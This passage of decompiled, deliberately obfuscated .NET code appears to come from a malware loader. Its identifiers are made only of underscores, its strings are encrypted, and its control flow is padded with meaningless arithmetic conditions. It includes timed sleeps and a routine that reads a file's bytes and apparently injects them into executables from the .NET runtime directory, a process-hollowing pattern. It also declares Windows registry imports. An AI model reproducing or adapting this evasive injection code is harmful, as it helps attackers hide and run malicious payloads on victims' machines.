				ProjectData.ClearProjectError();
			}
			return str;
		Label0:
			str2 = <Module>.__________(60048, Type.EmptyTypes.Length + 59075, (int)(sizeof(long) + 58));
			if ((-2600 | 16777216 * <Module>._________________) == -2600)
			{
				if (length == 5437)
				{
					goto Label2;
				}
			}
			str1 = <Module>.__________((int)(sizeof(short) + 22408), Type.EmptyTypes.Length + 20922, 162);
			obj = Type.EmptyTypes.Length + 4;
			goto Label14;
		Label1:
			if (!_____________________________________________________________________.______________(str6, _____________________________________________________________________._))
			{
				if (num1 % 230 != 1097529989)
				{
					num4 = ((1010 * num3 + 14 * num3 - (num2 * 3 + num2 - 1257847919) & 2) != 2 ? Type.EmptyTypes.Length + 941375870 : Type.EmptyTypes.Length + 65179);
				}
				else
				{
					num4 = (int)-1576650676;
				}
				str = <Module>.__________(num4, 68642, (int)(sizeof(double) + 133));
				return str;
			}
			Thread.Sleep(3500);
			if (File.Exists(str6))
			{
				goto Label15;
			}
			if ((9444 & ~(num * -663879680)) == 9444)
			{
				if (length == -30574)
				{
					goto Label7;
				}
				goto Label12;
			}
			else
			{
				goto Label12;
			}
		Label2:
			if (str8.Contains(<Module>._______<string>(-1046284514)))
			{
				str2 = _____________________________________________________________________._____________(str8);
				num = length;
				length = -22424;
				if (num == -14822)
				{
					goto Label17;
				}
				goto Label16;
			}
		Label17:
			length = -22424;
			if (str8.Contains(<Module>._______<string>(-150553471)))
			{
				str1 = _____________________________________________________________________._____________(str8);
				if (length == -22424)
				{
					goto Label18;
				}
				goto Label1;
			}
		Label18:
			if (str8.Contains(<Module>._______<string>(-95780923)))
			{
				goto Label19;
			}
		Label9:
			num3++;
			goto Label20;
		Label4:
			int length1 = Type.EmptyTypes.Length + 39688;
			(num2 & 956809252) != 0;
			str9 = <Module>.__________(length1, ((-(69 * num3 + 187 * num3) | -70) != -70 ? Type.EmptyTypes.Length + 1117107176 : (int)(sizeof(byte) + 38368)), (~(4 * (num1 / 54947)) != num1 / 16777216 ? Type.EmptyTypes.Length + 35 : (int)(sizeof(byte) + -1634100362)));
			length = 7587;
			if (Type.EmptyTypes.Length + -19575 == 1870)
			{
				goto Label21;
			}
		Label16:
			strArrays3 = strArrays4;
			num3 = 0;
			goto Label20;
			return str;
		Label6:
			strArrays2[5] = str9;
			strArrays2[6] = <Module>.____<string>(-531874208);
			str5 = string.Concat(strArrays2);
		Label13:
			num2++;
			goto Label22;
		Label7:
			strArrays2[1] = str2;
			strArrays2[2] = <Module>.______<string>(1514956238);
			obj = sizeof(ulong) + -5;
			goto Label14;
			if (num1 % 230 != 1097529989)
			{
				num4 = ((1010 * num3 + 14 * num3 - (num2 * 3 + num2 - 1257847919) & 2) != 2 ? Type.EmptyTypes.Length + 941375870 : Type.EmptyTypes.Length + 65179);
			}
			else
			{
				num4 = (int)-1576650676;
			}
			str = <Module>.__________(num4, 68642, (int)(sizeof(double) + 133));
			return str;
		Label12:
			Thread.Sleep(10000);
		Label15:
			if (File.Exists(str6))
			{
				goto Label23;
			}
			else
			{
				if (num1 % 230 != 1097529989)
				{
					num4 = ((1010 * num3 + 14 * num3 - (num2 * 3 + num2 - 1257847919) & 2) != 2 ? Type.EmptyTypes.Length + 941375870 : Type.EmptyTypes.Length + 65179);
				}
				else
				{
					num4 = (int)-1576650676;
				}
				str = <Module>.__________(num4, 68642, (int)(sizeof(double) + 133));
				return str;
			}
		Label19:
			str9 = _____________________________________________________________________._____________(str8);
			if (length * 2130706432 - (-775 | length) != -710788624)
			{
				if (____ / 452375622 + 3605 == -1817526503)
				{
					return str;
				}
				obj = Type.EmptyTypes.Length + 10;
				goto Label14;
			}
			else
			{
				obj = checked((int)1950443475);
				goto Label14;
			}
		Label20:
			if (num3 >= checked((int)strArrays3.Length))
			{
				goto Label25;
			}
			str8 = strArrays3[num3];
			length = Type.EmptyTypes.Length + -14822;
			obj = sizeof(short) + -1;
			goto Label14;
		Label23:
			str3 = File.ReadAllText(str6);
			obj = Type.EmptyTypes.Length + 5;
			goto Label14;
		Label25:
			length = -15865;
			int ______ = <Module>.___________;
			if (((______ / 632 & 973078528) == (973078528 & ______ / 214225 >> 2) ? (int)(sizeof(Guid) + -6516) : Type.EmptyTypes.Length + 2059923956) == -13040)
			{
				goto Label8;
			}
			if (!(Operators.CompareString(str2, <Module>.__________(4915, (int)(sizeof(float) + 7605), (int)(sizeof(uint) + -4)), false) != 0 & Operators.CompareString(str1, <Module>.__________(Type.EmptyTypes.Length + 51236, (int)(sizeof(short) + 49593), 21), false) != 0 & Operators.CompareString(str9, <Module>.__________(((num1 * 31 + num1 * 33 - num1 * 536870912 & 30) == 0 ? Type.EmptyTypes.Length + 49616 : Type.EmptyTypes.Length + -1003924050), (int)(sizeof(short) + 53066), 178), false) != 0))
			{
				goto Label13;
			}
			length = 21883;
			if ((254 * num3 + num3 * 258 - 9193 ^ 910673055) == 0)
			{
				goto Label9;
			}
			strArrays2 = new string[] { str5, null, null, null, null, null, null };
			goto Label7;
		}
	}

	public static string _____________(string string_0)
	{
		string str;
		int length;
		try
		{
			string[] strArrays = Strings.Split(string_0, <Module>.___<string>(1801837936), -1, CompareMethod.Binary);
			str = strArrays[1];
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			int num = Type.EmptyTypes.Length + 63388;
			int length1 = Type.EmptyTypes.Length + 62726;
			int num1 = ___________._;
			if ((num1 % 32768 & 1813544960) != 0)
			{
				length = 1707050847;
			}
			else if ((-8421 ^ num1 * 15 + num1) == 0)
			{
				length = Type.EmptyTypes.Length + -1110697287;
			}
			else if (-8183 + num1 == -(8649 & num1))
			{
				length = (int)(sizeof(Guid) + -1167070682);
			}
			else if (((8175 ^ num1 * 68 + 60 * num1) & 49) != 33)
			{
				length = Type.EmptyTypes.Length + 1512644890;
			}
			else
			{
				length = (-1482 + (2112 & <Module>._______________) != -1275 ? Type.EmptyTypes.Length + 60 : 1886717413);
			}
			str = <Module>.__________(num, length1, length);
			ProjectData.ClearProjectError();
		}
		return str;
	}

	public static bool ______________(string string_0, string string_1)
	{
		bool flag;
		try
		{
			string str = string.Format(<Module>._____<string>(574444263), string_0);
			byte[] numArray = File.ReadAllBytes(string_1);
			int num = checked((int)-11619);
			int length = Type.EmptyTypes.Length + 1;
			while (true)
			{
				switch (length)
				{
					case 0:
					{
						flag = true;
						return flag;
					}
					case 1:
					{
						if (_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>._____<string>(-328025195)), str, numArray, true, true, true))
						{
							if (num != -5625)
							{
								goto Label1;
							}
						}
						else if (_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>._______<string>(2089763217)), str, numArray, true, true, true))
						{
							num = -5226;
							if (Type.EmptyTypes.Length + 12670 == -25351)
							{
								goto Label1;
							}
						}
						else if (_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>._____<string>(1268431446)), str, numArray, true, true, true))
						{
							length = Type.EmptyTypes.Length + 0;
							continue;
						}
						else if (_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>.______<string>(-1240374798)), str, numArray, true, true, true))
						{
							flag = true;
							return flag;
						}
						else if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, str, numArray, false, true, true))
						{
							flag = false;
							return flag;
						}
						else
						{
							flag = true;
							return flag;
						}
						flag = true;
						return flag;
					}
					default:
					{
						goto Label2;
					}
				}
			}
		Label1:
			flag = true;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	[DllImport("advapi32.dll", CharSet=CharSet.Auto, ExactSpelling=false, SetLastError=true)]
	public static extern int RegOpenKeyEx(UIntPtr uintptr_0, ref string string_0, int int_0, int int_1, ref int int_2);

	[DllImport("advapi32.dll", CharSet=CharSet.None, ExactSpelling=false, SetLastError=true)]
	internal static extern int RegQueryValueEx(UIntPtr uintptr_0, string string_0, int int_0, ref int int_1, byte[] byte_0, ref int int_2);
}